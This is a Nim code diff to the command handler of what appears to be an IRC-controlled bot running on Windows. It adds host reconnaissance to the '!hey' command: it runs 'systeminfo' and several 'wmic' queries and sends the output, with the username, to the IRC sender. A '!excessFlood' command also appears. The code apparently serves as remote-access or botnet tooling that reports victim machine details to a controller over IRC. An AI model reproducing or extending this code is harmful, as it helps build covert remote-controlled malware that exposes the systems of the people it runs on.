@@ -451,14 +451,50 @@ proc cmdh_handle*(event:IrcEvent, client:AsyncIrc):void {.thread.} =
 
     case tokens[0]:
     of "!hey":
-        var win_ver = "<void>"
+        var
+            win_ver = "<void>"
+            win_csd = "<void>"
+            win_sys = "<void>"
+            win_mod = "<void>"
+        
         try:
             var (output, _ ) = execCmdEx("ver" ,options = {poUsePath})
             output = output.strip(chars={'\r','\n'})
             win_ver = output
-        except:
-            win_ver = "<error>"
-        discard client.privmsg(event.origin, "heyyy v" & $current_version & " as " & getEnv("USERNAME") & " windows version: " & win_ver)
+        except OSError as e:
+            win_ver = repr(e)
+
+        try:
+            var (output, _ ) = execCmdEx("wmic os get Caption,CSDVersion /value" ,options = {poUsePath})
+            output = output.strip(chars={'\r','\n'})
+            win_csd = output
+        except OSError as e:
+            win_csd = repr(e)
+        
+        try:
+            var (output, _ ) = execCmdEx("systeminfo" ,options = {poUsePath})
+            output = output.strip(chars={'\r','\n'})
+            win_sys = output
+        except OSError as e:
+            win_sys = repr(e)
+        
+        try:
+            var (output, _ ) = execCmdEx("wmic computersystem get Model /value" ,options = {poUsePath})
+            output = output.strip(chars={'\r','\n'})
+            win_mod = output
+        except OSError as e:
+            win_mod = repr(e)
+
+        
+        discard client.privmsg(event.origin,
+            "heyyy v" & 
+            $current_version & " as " & getEnv("USERNAME") &
+            " VER: [" & win_ver & "]" &
+            " CSD: [" & win_csd & "]" &
+            " SYS: [" & win_sys & "]" &
+            " MOD: [" & win_mod & "]" 
+            )
+
     of "!lag": discard client.privmsg(event.origin, formatFloat(client.getLag))
     of "!excessFlood":
         for i in 0..10:
